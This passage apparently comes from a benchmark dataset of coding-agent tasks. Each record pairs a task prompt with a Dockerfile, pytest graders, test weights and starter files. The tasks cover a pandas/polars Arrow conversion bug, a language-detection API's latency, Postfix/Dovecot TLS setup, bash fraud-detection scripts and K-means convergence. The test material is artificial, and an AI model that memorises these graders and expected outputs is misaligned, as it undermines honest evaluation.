    assert 0 <= count <= 10, f""Regression count should be between 0 and 10, got: {count}""","{""test_regression_count_file_exists"": 0.5, ""test_regression_count_reasonable"": 0.5}","{""generate_build_data.py"": ""import json\nimport random\nfrom datetime import datetime, timedelta\n\n# Generate build history with natural variations\nbuild_history = []\nbase_time = datetime(2024, 1, 1, 0, 0, 0)\nbase_duration = 300  # 5 minutes base build time\n\nfor i in range(100):\n    # Natural variations in build time (\u00b120% normally)\n    variation = random.gauss(0, 0.1)  # 10% standard deviation\n    duration = base_duration * (1 + variation)\n    duration = max(180, duration)  # minimum 3 minutes\n    \n    build = {\n        \""build_number\"": i + 1,\n        \""timestamp\"": (base_time + timedelta(hours=i*4)).isoformat(),\n        \""duration_seconds\"": round(duration, 1),\n        \""commit_hash\"": f\""{random.randint(1000000, 9999999):07x}\"",\n        \""status\"": \""success\""\n    }\n    build_history.append(build)\n\n# Generate recent builds with some regressions\nrecent_builds = []\nrecent_base_time = base_time + timedelta(days=17)\n\nfor i in range(10):\n    # Make builds 3, 6, and 8 be regressions (significantly slower)\n    if i in [2, 5, 7]:  # 0-indexed\n        # Regression: 2.5 to 3 standard deviations above mean\n        variation = random.uniform(0.25, 0.35)\n    else:\n        # Normal variation\n        variation = random.gauss(0, 0.1)\n    \n    duration = base_duration * (1 + variation)\n    duration = max(180, duration)\n    \n    build = {\n        \""build_number\"": 101 + i,\n        \""timestamp\"": (recent_base_time + timedelta(hours=i*4)).isoformat(),\n        \""duration_seconds\"": round(duration, 1),\n        \""commit_hash\"": f\""{random.randint(1000000, 9999999):07x}\"",\n        \""status\"": \""success\""\n    }\n    recent_builds.append(build)\n\n# Save the data\nwith open('build_history.json', 'w') as f:\n    json.dump(build_history, f, indent=2)\n\nwith open('recent_builds.json', 'w') as f:\n    json.dump(recent_builds, f, indent=2)\n\nprint(\""Generated build data files\"")""}",2025-07-22T21:09:25.899496+00:00,2025-07-23T08:51:01.911831+00:00
draft_dp_5d45ac7d,hard,draft_dp_5d45ac7d,data-processing,Our data pipeline is corrupting data when sharing Arrow tables between pandas and polars. The nested struct columns are getting scrambled. Need this fixed ASAP - we're losing customer transaction records.,data-processing,python|data-processing|debugging,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

# Install packages with specific versions to simulate compatibility issues
# Using different arrow backend versions
RUN pip install --no-cache-dir pandas==2.2.3 && \
    pip install --no-cache-dir pyarrow==18.1.0 && \
    pip install --no-cache-dir polars==1.15.0 && \
    pip install --no-cache-dir numpy

# Copy the data pipeline files
COPY pipeline.py /app/
COPY data_converter.py /app/
COPY generate_test_data.py /app/

# Generate test data
RUN python generate_test_data.py

# Create output directory
RUN mkdir -p /app/output

CMD [""bash""]","import subprocess
import os
import json
import pandas as pd
import pyarrow.parquet as pq

def test_pipeline_completes_without_corruption():
    """"""Test that the pipeline runs successfully and preserves nested data.""""""
    # Run the pipeline
    result = subprocess.run(['python', '/app/pipeline.py'], 
                          capture_output=True, text=True, cwd='/app')
    
    # Pipeline should complete successfully
    assert result.returncode == 0, f""Pipeline failed with: {result.stderr}""
    assert ""Pipeline completed successfully"" in result.stdout
    
    # Verify output file exists
    assert os.path.exists('/app/output/processed_transactions.parquet')
    
    # Load and check the output preserves nested structs correctly
    output_df = pd.read_parquet('/app/output/processed_transactions.parquet')
    
    # Should have processed customer summaries
    assert len(output_df) > 0, ""No customer summaries generated""
    
    # Check that nested transaction details are preserved (not corrupted/null)
    first_transactions = output_df['first_transaction'].dropna()
    assert len(first_transactions) > 0, ""All transaction details are null/corrupted""
    
    # Verify nested struct integrity - should have merchant and metadata fields
    sample_transaction = first_transactions.iloc[0]
    assert 'merchant' in sample_transaction, ""Nested merchant data missing""
    assert 'metadata' in sample_transaction, ""Nested metadata missing""
    assert sample_transaction['merchant']['id'].startswith('MERCH_'), ""Merchant ID corrupted""

def test_data_integrity_between_frameworks():
    """"""Test that data remains consistent when converted between pandas and polars.""""""
    # Load original data with pandas
    pandas_df = pd.read_parquet('/app/test_data.parquet')
    original_count = len(pandas_df)
    
    # Import and use the converter function
    import sys
    sys.path.append('/app')
    from data_converter import convert_pandas_to_polars_arrow
    
    # Convert to polars and back
    polars_df = convert_pandas_to_polars_arrow(pandas_df)
    
    # Basic integrity checks
    assert len(polars_df) == original_count, f""Row count mismatch: {len(polars_df)} vs {original_count}""
    
    # Check nested column preservation
    # Get first transaction detail from both
    pandas_first = pandas_df['transaction_details'].iloc[0]
    polars_first = polars_df['transaction_details'][0]
    
    # Verify merchant data matches
    assert pandas_first['merchant']['id'] == polars_first['merchant']['id'], ""Merchant ID corrupted during conversion""
    assert pandas_first['merchant']['category'] == polars_first['merchant']['category'], ""Merchant category corrupted""","{""test_pipeline_completes_without_corruption"": 0.6, ""test_data_integrity_between_frameworks"": 0.4}","{""generate_test_data.py"": ""#!/usr/bin/env python3\n\""\""\""Generate test data with nested structs for the pipeline.\""\""\""\n\nimport pandas as pd\nimport pyarrow as pa\nimport pyarrow.parquet as pq\nimport numpy as np\nfrom datetime import datetime, timedelta\nimport json\n\n# Generate test transaction data with nested structs\nnp.random.seed(42)\nn_records = 100\n\n# Create nested transaction details as dict columns\ntransaction_details = []\nfor i in range(n_records):\n    detail = {\n        'timestamp': (datetime.now() - timedelta(days=np.random.randint(0, 30))).isoformat(),\n        'merchant': {\n            'id': f'MERCH_{np.random.randint(1000, 9999)}',\n            'name': f'Store_{np.random.randint(1, 100)}',\n            'category': np.random.choice(['retail', 'food', 'service'])\n        },\n        'metadata': {\n            'source': np.random.choice(['online', 'instore', 'mobile']),\n            'verified': bool(np.random.choice([True, False]))\n        }\n    }\n    transaction_details.append(detail)\n\n# Create main dataframe\ndf = pd.DataFrame({\n    'transaction_id': [f'TXN_{i:06d}' for i in range(n_records)],\n    'customer_id': [f'CUST_{np.random.randint(1, 200):04d}' for _ in range(n_records)],\n    'transaction_amount': np.random.uniform(10, 1000, n_records).round(2),\n    'transaction_details': transaction_details\n})\n\n# Save as parquet with proper schema\ndf.to_parquet('test_data.parquet', engine='pyarrow')\nprint(f\""Generated {n_records} test records with nested structs\"")\n\n# Also save a sample as JSON for debugging\nsample = df.head(5).to_dict('records')\nwith open('sample_data.json', 'w') as f:\n    json.dump(sample, f, indent=2)\nprint(\""Saved sample data to sample_data.json\"")"", ""data_converter.py"": ""\""\""\""\nData converter module with utilities for Arrow table conversions.\n\""\""\""\n\nimport pyarrow as pa\nimport pandas as pd\nimport polars as pl\n\ndef convert_pandas_to_polars_arrow(df_pandas):\n    \""\""\""\n    Convert pandas DataFrame to polars via Arrow.\n    Currently has issues with nested structs.\n    \""\""\""\n    # Simple direct conversion - doesn't handle nested types properly\n    arrow_table = pa.Table.from_pandas(df_pandas)\n    return pl.from_arrow(arrow_table)\n\ndef validate_arrow_schema(table1, table2):\n    \""\""\""Check if two Arrow tables have compatible schemas.\""\""\""\n    return table1.schema == table2.schema"", ""pipeline.py"": ""#!/usr/bin/env python3\n\""\""\""\nData pipeline that shares Arrow tables between pandas and polars.\nCurrently has issues with nested struct columns getting corrupted.\n\""\""\""\n\nimport pandas as pd\nimport polars as pl\nimport pyarrow as pa\nimport pyarrow.parquet as pq\nfrom data_converter import convert_pandas_to_polars_arrow\n\ndef process_transaction_data():\n    \""\""\""Process customer transaction data through pandas and polars.\""\""\""\n    # Load data with pandas\n    df_pandas = pd.read_parquet('test_data.parquet', engine='pyarrow')\n    print(f\""Loaded {len(df_pandas)} records with pandas\"")\n    \n    # Convert to Arrow table \n    # BUG: Direct conversion doesn't preserve nested struct metadata correctly\n    arrow_table = pa.Table.from_pandas(df_pandas)\n    \n    # This conversion loses nested struct field names due to schema mismatch\n    df_polars = pl.from_arrow(arrow_table)\n    \n    # Process with polars - this will fail due to corrupted nested columns\n    try:\n        result = df_polars.group_by('customer_id').agg([\n            pl.col('transaction_amount').sum().alias('total_amount'),\n            pl.col('transaction_details').first().alias('first_transaction')\n        ])\n        \n        # Save result\n        result.write_parquet('/app/output/processed_transactions.parquet')\n        print(f\""Processed and saved {len(result)} customer summaries\"")\n        \n        return result\n    except Exception as e:\n        print(f\""Error during processing: {e}\"")\n        # Try to access nested fields to show corruption\n        try:\n            sample = df_polars.select('transaction_details').to_dicts()[0]\n            print(f\""Sample transaction_details: {sample}\"")\n        except:\n            print(\""Cannot access transaction_details - data is corrupted\"")\n        raise\n\nif __name__ == \""__main__\"":\n    try:\n        result = process_transaction_data()\n        print(\""Pipeline completed successfully\"")\n    except Exception as e:\n        print(f\""Pipeline failed: {e}\"")\n        import traceback\n        traceback.print_exc()\n        raise""}",2025-07-22T21:11:34.363224+00:00,2025-07-22T21:19:51.317694+00:00
draft_dp_6225418b,medium,draft_dp_6225418b,software-engineering,The language detection API is too slow - getting 500ms+ response times. Need it under 200ms for new texts and under 50ms for repeated queries. The service should run on port 7000.,software-engineering,python|api|performance-optimization,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

# Copy application files
COPY requirements.txt /app/
COPY app.py /app/

# Install Python dependencies
RUN pip install -r requirements.txt

# Run the Flask app
CMD python app.py","import subprocess
import json
import time
import requests

def test_api_performance_new_text():
    """"""Test that the API responds under 200ms for new texts""""""
    # Wait for service to be ready
    for _ in range(30):
        try:
            response = requests.get('http://localhost:7000/health')
            if response.status_code == 200:
                break
        except:
            pass
        time.sleep(1)
    
    # Test with a unique text to ensure it's not cached
    unique_text = f""This is a test in English at time {time.time()}""
    
    start_time = time.time()
    response = requests.post('http://localhost:7000/detect', 
                           json={'text': unique_text})
    end_time = time.time()
    
    assert response.status_code == 200
    data = response.json()
    assert 'language' in data
    assert 'confidence' in data
    
    response_time_ms = (end_time - start_time) * 1000
    assert response_time_ms < 200, f""Response time {response_time_ms:.2f}ms exceeds 200ms limit""

def test_api_performance_cached():
    """"""Test that the API responds under 50ms for repeated queries""""""
    # Use the same text twice
    test_text = ""Bonjour, comment allez-vous?""
    
    # First request to populate cache
    response = requests.post('http://localhost:7000/detect', 
                           json={'text': test_text})
    assert response.status_code == 200
    
    # Second request should be cached
    start_time = time.time()
    response = requests.post('http://localhost:7000/detect', 
                           json={'text': test_text})
    end_time = time.time()
    
    assert response.status_code == 200
    response_time_ms = (end_time - start_time) * 1000
    assert response_time_ms < 50, f""Cached response time {response_time_ms:.2f}ms exceeds 50ms limit""","{""test_api_performance_new_text"": 0.6, ""test_api_performance_cached"": 0.4}","{""requirements.txt"": ""flask==3.0.0\nlangdetect==1.0.9\ngunicorn==21.2.0"", ""app.py"": ""from flask import Flask, request, jsonify\nimport time\nfrom langdetect import detect_langs\nimport logging\n\napp = Flask(__name__)\nlogging.basicConfig(level=logging.INFO)\n\n@app.route('/detect', methods=['POST'])\ndef detect_language():\n    start_time = time.time()\n    \n    data = request.get_json()\n    if not data or 'text' not in data:\n        return jsonify({'error': 'No text provided'}), 400\n    \n    text = data['text']\n    \n    try:\n        detections = detect_langs(text)\n        result = {\n            'language': detections[0].lang,\n            'confidence': detections[0].prob,\n            'processing_time_ms': (time.time() - start_time) * 1000\n        }\n        \n        logging.info(f\""Processed text, took {result['processing_time_ms']:.2f}ms\"")\n        \n        return jsonify(result)\n    except Exception as e:\n        return jsonify({'error': str(e)}), 500\n\n@app.route('/health', methods=['GET'])\ndef health():\n    return jsonify({'status': 'ok'})\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=7000)""}",2025-07-22T21:14:35.816618+00:00,2025-07-23T08:51:58.225896+00:00
draft_dp_74d54321,hard,draft_dp_74d54321,system-administration,The mail server is rejecting connections - need to set up TLS for Postfix (SMTP) and Dovecot (IMAP). Generate certificates for mail.company.local and enforce encryption on port 587 (SMTP) and 993 (IMAP).,system-administration,sys-admin|security|networking,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

WORKDIR /root

# Install mail server packages
RUN apt-get update && apt-get install -y \
    postfix \
    dovecot-core \
    dovecot-imapd \
    openssl \
    mailutils \
    swaks \
    net-tools \
    telnet \
    python3 \
    python3-pip \
    python3-pytest \
    && rm -rf /var/lib/apt/lists/*

# Create mail user
RUN useradd -m -s /bin/bash testuser && \
    echo ""testuser:password123"" | chpasswd

# Set up mail directories
RUN mkdir -p /var/mail && \
    chown -R postfix:postfix /var/mail && \
    mkdir -p /etc/postfix/ssl

# Copy configuration files
COPY postfix_main.cf /etc/postfix/main.cf
COPY postfix_master.cf /etc/postfix/master.cf
COPY dovecot.conf /etc/dovecot/dovecot.conf

# Set permissions
RUN chmod 644 /etc/postfix/main.cf /etc/postfix/master.cf && \
    chmod 644 /etc/dovecot/dovecot.conf && \
    chown root:root /etc/postfix/main.cf /etc/postfix/master.cf && \
    chown root:root /etc/dovecot/dovecot.conf

# Create mailbox for testuser
RUN mkdir -p /home/testuser/Maildir/{new,cur,tmp} && \
    chown -R testuser:testuser /home/testuser/Maildir

CMD [""/bin/bash""]","import subprocess
import socket
import ssl
import time
import os

def test_smtp_tls_enabled():
    """"""Test that SMTP on port 587 enforces STARTTLS""""""
    # First ensure postfix is running
    subprocess.run(['service', 'postfix', 'start'], capture_output=True)
    time.sleep(2)
    
    # Test STARTTLS is available and enforced
    result = subprocess.run(
        ['swaks', '--to', 'testuser@company.local', '--from', 'sender@company.local',
         '--server', 'localhost:587', '--tls', '--quit-after', 'EHLO'],
        capture_output=True, text=True
    )
    
    # Check that TLS is offered and working
    assert 'STARTTLS' in result.stdout, ""STARTTLS not offered on port 587""
    assert 'TLS started' in result.stdout or 'TLS connection established' in result.stdout, ""TLS negotiation failed""
    
    # Verify certificate is for mail.company.local
    cert_check = subprocess.run(
        ['openssl', 's_client', '-connect', 'localhost:587', '-starttls', 'smtp', '-servername', 'mail.company.local'],
        input=b'QUIT\n', capture_output=True, text=True
    )
    assert 'CN=mail.company.local' in cert_check.stdout or 'CN = mail.company.local' in cert_check.stdout, ""Certificate not issued for mail.company.local""

def test_imap_ssl_enabled():
    """"""Test that IMAP on port 993 uses SSL/TLS""""""
    # Ensure dovecot is running
    subprocess.run(['service', 'dovecot', 'start'], capture_output=True)
    time.sleep(2)
    
    # Check if port 993 is listening
    netstat = subprocess.run(['netstat', '-tlnp'], capture_output=True, text=True)
    assert ':993' in netstat.stdout, ""IMAPS port 993 not listening""
    
    # Test SSL connection to IMAP
    cert_check = subprocess.run(
        ['openssl', 's_client', '-connect', 'localhost:993', '-servername', 'mail.company.local'],
        input=b'. LOGOUT\n', capture_output=True, text=True
    )
    
    # Verify SSL handshake succeeded
    assert 'SSL handshake has read' in cert_check.stdout, ""SSL handshake failed on port 993""
    assert 'CN=mail.company.local' in cert_check.stdout or 'CN = mail.company.local' in cert_check.stdout, ""Certificate not issued for mail.company.local""
    
    # Verify IMAP banner appears over SSL
    assert 'OK' in cert_check.stdout and ('Dovecot' in cert_check.stdout or 'IMAP' in cert_check.stdout), ""IMAP service not responding properly over SSL""","{""test_smtp_tls_enabled"": 0.5, ""test_imap_ssl_enabled"": 0.5}","{""postfix_master.cf"": ""# Postfix master process configuration file\nsmtp      inet  n       -       y       -       -       smtpd\npickup    unix  n       -       y       60      1       pickup\ncleanup   unix  n       -       y       -       0       cleanup\nqmgr      unix  n       -       n       300     1       qmgr\ntlsmgr    unix  -       -       y       1000?   1       tlsmgr\nrewrite   unix  -       -       y       -       -       trivial-rewrite\nbounce    unix  -       -       y       -       0       bounce\ndefer     unix  -       -       y       -       0       bounce\ntrace     unix  -       -       y       -       0       bounce\nverify    unix  -       -       y       -       1       verify\nflush     unix  n       -       y       1000?   0       flush\nproxymap  unix  -       -       n       -       -       proxymap\nproxywrite unix -       -       n       -       1       proxymap\nsmtp      unix  -       -       y       -       -       smtp\nrelay     unix  -       -       y       -       -       smtp\nshowq     unix  n       -       y       -       -       showq\nerror     unix  -       -       y       -       -       error\nretry     unix  -       -       y       -       -       error\ndiscard   unix  -       -       y       -       -       discard\nlocal     unix  -       n       n       -       -       local\nvirtual   unix  -       n       n       -       -       virtual\nlmtp      unix  -       -       y       -       -       lmtp\nanvil     unix  -       -       y       -       1       anvil\nscache    unix  -       -       y       -       1       scache\npostlog   unix-dgram n  -       n       -       1       postlogd"", ""postfix_main.cf"": ""# Postfix main configuration\nmyhostname = mail.company.local\nmydomain = company.local\nmyorigin = $mydomain\ninet_interfaces = all\nmydestination = $myhostname, localhost.$mydomain, localhost, $mydomain\nhome_mailbox = Maildir/\nsmtpd_banner = $myhostname ESMTP\ndisable_vrfy_command = yes\n\n# Basic settings\nmessage_size_limit = 10485760\nmailbox_size_limit = 1073741824\n\n# Network settings\nmynetworks = 127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16\n\n# Authentication\nsmtpd_sasl_type = dovecot\nsmtpd_sasl_path = private/auth\nsmtpd_sasl_auth_enable = yes\nbroken_sasl_auth_clients = yes\nsmtpd_sasl_security_options = noanonymous\nsmtpd_sasl_local_domain = $mydomain"", ""dovecot.conf"": ""protocols = imap\nlisten = *, ::\nbase_dir = /var/run/dovecot/\n\n# Authentication\nauth_mechanisms = plain login\ndisable_plaintext_auth = yes\n\n# Mail location\nmail_location = maildir:~/Maildir\n\n# Namespaces\nnamespace inbox {\n  inbox = yes\n}\n\n# Services\nservice imap-login {\n  inet_listener imap {\n    port = 143\n  }\n}\n\nservice auth {\n  unix_listener /var/spool/postfix/private/auth {\n    mode = 0660\n    user = postfix\n    group = postfix\n  }\n}\n\n# Logging\nlog_path = /var/log/dovecot.log\ninfo_log_path = /var/log/dovecot-info.log\n\n# User database\nuserdb {\n  driver = passwd\n}\n\npassdb {\n  driver = pam\n}""}",2025-07-22T21:12:02.718622+00:00,2025-07-23T08:52:20.535603+00:00
draft_dp_f0d6091e,hard,draft_dp_f0d6091e,data-processing,Our fraud detection scripts are flagging too many false positives. Need you to fix fraud_detector.sh to properly correlate transactions across logs and calculate risk scores using the rules in fraud_rules.json. Also make fraud_report.sh generate proper JSON reports for specific user IDs.,data-processing,data-processing|analysis|automation,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

WORKDIR /app

# Install required tools
RUN apt-get update && apt-get install -y \
    jq \
    bc \
    gawk \
    && rm -rf /var/lib/apt/lists/*

# Copy all files
COPY fraud_rules.json /app/
COPY transactions.log /app/
COPY user_activity.log /app/
COPY locations.json /app/
COPY fraud_detector.sh /app/
COPY fraud_report.sh /app/

# Make scripts executable
RUN chmod +x /app/fraud_detector.sh /app/fraud_report.sh

CMD [""/bin/bash""]","import subprocess
import json
import os

def test_fraud_detector_identifies_high_risk_users():
    """"""Test that fraud_detector.sh correctly identifies high-risk users based on multiple indicators""""""
    # Run fraud detector
    result = subprocess.run(['bash', '/app/fraud_detector.sh'], 
                          capture_output=True, text=True, cwd='/app')
    
    # Should identify USER123 and USER111 as high risk
    # USER123: rapid transactions across locations + payment failures
    # USER111: geographic anomaly (Miami to Seattle quickly) + high amounts
    output = result.stdout
    
    # Check that high-risk users are identified with proper risk scores
    assert 'USER123' in output and ('HIGH' in output or 'risk_score' in output)
    assert 'USER111' in output and ('HIGH' in output or 'risk_score' in output)
    
    # Should NOT flag USER456 or USER789 as high risk (normal behavior)
    lines_with_456 = [line for line in output.split('\n') if 'USER456' in line and ('HIGH' in line or 'ALERT' in line)]
    lines_with_789 = [line for line in output.split('\n') if 'USER789' in line and ('HIGH' in line or 'ALERT' in line)]
    
    # These users should have low risk or no alerts
    assert len(lines_with_456) == 0 or 'LOW' in ' '.join(lines_with_456)
    assert len(lines_with_789) == 0 or 'LOW' in ' '.join(lines_with_789)

def test_fraud_report_generates_valid_json():
    """"""Test that fraud_report.sh generates proper JSON report for a specific user""""""
    # Test with USER123 who has suspicious activity
    result = subprocess.run(['bash', '/app/fraud_report.sh', 'USER123'], 
                          capture_output=True, text=True, cwd='/app')
    
    # Output should be valid JSON
    try:
        report = json.loads(result.stdout)
    except json.JSONDecodeError:
        assert False, ""Output is not valid JSON""
    
    # Report should contain expected fields
    assert 'user_id' in report
    assert report['user_id'] == 'USER123'
    assert 'transactions' in report
    assert 'risk_indicators' in report
    assert 'total_risk_score' in report
    
    # Should have multiple transactions
    assert len(report['transactions']) >= 5  # USER123 has 6 transactions
    
    # Risk score should be high for this user
    assert report['total_risk_score'] >= 60  # Based on rules, should be high risk","{""test_fraud_detector_identifies_high_risk_users"": 0.6, ""test_fraud_report_generates_valid_json"": 0.4}","{""locations.json"": ""{\n  \""cities\"": {\n    \""New York\"": {\""lat\"": 40.7128, \""lon\"": -74.0060},\n    \""Los Angeles\"": {\""lat\"": 34.0522, \""lon\"": -118.2437},\n    \""Boston\"": {\""lat\"": 42.3601, \""lon\"": -71.0589},\n    \""Chicago\"": {\""lat\"": 41.8781, \""lon\"": -87.6298},\n    \""Miami\"": {\""lat\"": 25.7617, \""lon\"": -80.1918},\n    \""Seattle\"": {\""lat\"": 47.6062, \""lon\"": -122.3321}\n  }\n}"", ""fraud_report.sh"": ""#!/bin/bash\n\n# Fraud report generator - currently broken\n# Should generate JSON report for a specific user\n\nUSER_ID=$1\n\nif [ -z \""$USER_ID\"" ]; then\n    echo \""Usage: $0 <USER_ID>\""\n    exit 1\nfi\n\n# Currently just prints plain text instead of JSON\necho \""Fraud Report for $USER_ID\""\necho \""=======================\""\ngrep \""$USER_ID\"" transactions.log"", ""user_activity.log"": ""2024-01-15 10:20:00|USER123|LOGIN|SUCCESS|New York|192.168.1.100\n2024-01-15 10:22:30|USER123|VIEW_PRODUCT|Electronics|New York|192.168.1.100\n2024-01-15 10:23:00|USER123|ADD_TO_CART|PROD567|New York|192.168.1.100\n2024-01-15 10:25:45|USER123|LOGIN|SUCCESS|Los Angeles|10.0.0.50\n2024-01-15 10:26:00|USER123|VIEW_PRODUCT|Electronics|Los Angeles|10.0.0.50\n2024-01-15 11:40:00|USER456|LOGIN|SUCCESS|Boston|172.16.0.25\n2024-01-15 11:42:15|USER456|VIEW_PRODUCT|Books|Boston|172.16.0.25\n2024-01-15 11:44:30|USER456|ADD_TO_CART|PROD123|Boston|172.16.0.25\n2024-01-15 14:28:00|USER789|LOGIN|SUCCESS|Chicago|192.168.2.75\n2024-01-15 14:29:30|USER789|VIEW_PRODUCT|Home|Chicago|192.168.2.75\n2024-01-15 16:40:00|USER111|LOGIN|SUCCESS|Miami|10.1.1.100\n2024-01-15 16:42:00|USER111|VIEW_PRODUCT|Luxury|Miami|10.1.1.100\n2024-01-15 16:44:00|USER111|ADD_TO_CART|PROD999|Miami|10.1.1.100\n2024-01-15 16:45:30|USER111|LOGIN|SUCCESS|Seattle|172.20.0.50"", ""fraud_rules.json"": ""{\n  \""rules\"": {\n    \""velocity_check\"": {\n      \""description\"": \""Multiple transactions in short time\"",\n      \""threshold\"": 3,\n      \""timeframe_minutes\"": 10,\n      \""risk_score\"": 40\n    },\n    \""geographic_anomaly\"": {\n      \""description\"": \""Transactions from distant locations\"",\n      \""distance_threshold_km\"": 500,\n      \""timeframe_hours\"": 2,\n      \""risk_score\"": 35\n    },\n    \""payment_failures\"": {\n      \""description\"": \""Multiple failed payment attempts\"",\n      \""failure_threshold\"": 2,\n      \""risk_score\"": 30\n    },\n    \""unusual_amount\"": {\n      \""description\"": \""Transaction amount significantly higher than average\"",\n      \""multiplier\"": 3,\n      \""risk_score\"": 25\n    }\n  },\n  \""risk_thresholds\"": {\n    \""low\"": 30,\n    \""medium\"": 60,\n    \""high\"": 80\n  }\n}"", ""fraud_detector.sh"": ""#!/bin/bash\n\n# Simple fraud detector that needs fixing\n# Currently just prints all transactions as potential fraud\n\necho \""=== Fraud Detection Report ===\""\necho \""Timestamp: $(date)\""\necho \""\""\n\n# Just list all transactions (broken implementation)\nwhile IFS='|' read -r timestamp txn_id user_id amount status location payment_method; do\n    echo \""ALERT: Potential fraud - User: $user_id, Transaction: $txn_id, Amount: $amount\""\ndone < transactions.log"", ""transactions.log"": ""2024-01-15 10:23:45|TXN001|USER123|350.00|SUCCESS|New York|CREDIT_CARD\n2024-01-15 10:25:12|TXN002|USER123|275.00|SUCCESS|New York|CREDIT_CARD\n2024-01-15 10:26:38|TXN003|USER123|425.00|SUCCESS|Los Angeles|CREDIT_CARD\n2024-01-15 10:28:15|TXN004|USER123|890.00|FAILED|Los Angeles|CREDIT_CARD\n2024-01-15 10:29:45|TXN005|USER123|890.00|FAILED|Los Angeles|CREDIT_CARD\n2024-01-15 10:31:22|TXN006|USER123|890.00|SUCCESS|Los Angeles|DEBIT_CARD\n2024-01-15 11:45:30|TXN007|USER456|125.00|SUCCESS|Boston|CREDIT_CARD\n2024-01-15 12:15:45|TXN008|USER456|89.99|SUCCESS|Boston|CREDIT_CARD\n2024-01-15 14:30:00|TXN009|USER789|45.00|SUCCESS|Chicago|PAYPAL\n2024-01-15 14:32:15|TXN010|USER789|55.00|SUCCESS|Chicago|PAYPAL\n2024-01-15 16:45:22|TXN011|USER111|1250.00|SUCCESS|Miami|CREDIT_CARD\n2024-01-15 16:46:38|TXN012|USER111|2100.00|FAILED|Miami|CREDIT_CARD\n2024-01-15 16:47:55|TXN013|USER111|2100.00|SUCCESS|Seattle|CREDIT_CARD""}",2025-07-22T21:24:59.522821+00:00,2025-07-22T21:24:59.556813+00:00
draft_dp_5482dc53,medium,draft_dp_5482dc53,debugging,The K-means implementation in kmeans.py isn't converging - centroids keep jumping around. Need to fix the numerical stability issue without changing the convergence threshold (1e-10) or max iterations (500).,debugging,python|numpy|machine-learning,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

# Install numpy
RUN pip install numpy

# Copy the application files
COPY kmeans.py /app/
COPY main.py /app/
COPY data.csv /app/

CMD [""bash""]","import os
import numpy as np

def test_convergence():
    """"""Test that K-means converges within 500 iterations""""""
    # Check if convergence info file exists
    assert os.path.exists('convergence_info.txt'), ""Convergence info file not found""
    
    # Read convergence info
    with open('convergence_info.txt', 'r') as f:
        line = f.read().strip()
    
    # Extract number of iterations
    iterations = int(line.split()[2])
    
    # Should converge in less than 500 iterations
    assert iterations < 500, f""Algorithm did not converge properly (took {iterations} iterations)""
    assert iterations > 0, ""Invalid iteration count""

def test_stable_clustering():
    """"""Test that clustering produces stable results with valid clusters""""""
    # Check output files exist
    assert os.path.exists('cluster_assignments.txt'), ""Cluster assignments not found""
    assert os.path.exists('centroids.txt'), ""Centroids file not found""
    
    # Load cluster assignments
    labels = np.loadtxt('cluster_assignments.txt', dtype=int)
    
    # Check all labels are valid (0-4 for 5 clusters)
    assert np.all(labels >= 0), ""Found negative cluster labels""
    assert np.all(labels < 5), ""Found cluster labels >= 5""
    assert len(np.unique(labels)) == 5, ""Not all 5 clusters were used""
    
    # Load centroids
    centroids = np.loadtxt('centroids.txt', delimiter=',')
    assert centroids.shape == (5, 2), f""Expected 5x2 centroids, got {centroids.shape}""
    
    # Check centroids are finite (not NaN or inf)
    assert np.all(np.isfinite(centroids)), ""Centroids contain NaN or inf values""","{""test_convergence"": 0.6, ""test_stable_clustering"": 0.4}","{""kmeans.py"": ""import numpy as np\n\nclass KMeans:\n    def __init__(self, n_clusters=5, max_iters=500, tol=1e-10, random_state=42):\n        self.n_clusters = n_clusters\n        self.max_iters = max_iters\n        self.tol = tol\n        self.random_state = random_state\n        self.centroids = None\n        self.labels = None\n        self.n_iters = 0\n        \n    def fit(self, X):\n        np.random.seed(self.random_state)\n        n_samples, n_features = X.shape\n        \n        # Initialize centroids randomly from data points\n        indices = np.random.choice(n_samples, self.n_clusters, replace=False)\n        self.centroids = X[indices].copy()\n        \n        for i in range(self.max_iters):\n            # Assign points to nearest centroid\n            distances = np.zeros((n_samples, self.n_clusters))\n            for k in range(self.n_clusters):\n                distances[:, k] = np.sum((X - self.centroids[k]) ** 2, axis=1)\n            \n            self.labels = np.argmin(distances, axis=1)\n            \n            # Update centroids\n            new_centroids = np.zeros_like(self.centroids)\n            for k in range(self.n_clusters):\n                cluster_points = X[self.labels == k]\n                if len(cluster_points) > 0:\n                    new_centroids[k] = cluster_points.mean(axis=0)\n                else:\n                    # Keep old centroid if no points assigned\n                    new_centroids[k] = self.centroids[k]\n            \n            # Check convergence\n            centroid_shift = np.max(np.abs(new_centroids - self.centroids))\n            \n            self.centroids = new_centroids\n            self.n_iters = i + 1\n            \n            if centroid_shift < self.tol:\n                break\n                \n        return self\n    \n    def predict(self, X):\n        distances = np.zeros((X.shape[0], self.n_clusters))\n        for k in range(self.n_clusters):\n            distances[:, k] = np.sum((X - self.centroids[k]) ** 2, axis=1)\n        return np.argmin(distances, axis=1)\n    \n    def inertia_(self):\n        \""\""\""Calculate within-cluster sum of squares\""\""\""\n        if self.labels is None or self.centroids is None:\n            return None\n        \n        wcss = 0\n        for k in range(self.n_clusters):\n            cluster_points = X[self.labels == k]\n            if len(cluster_points) > 0:\n                wcss += np.sum((cluster_points - self.centroids[k]) ** 2)\n        return wcss"", ""data.csv"": 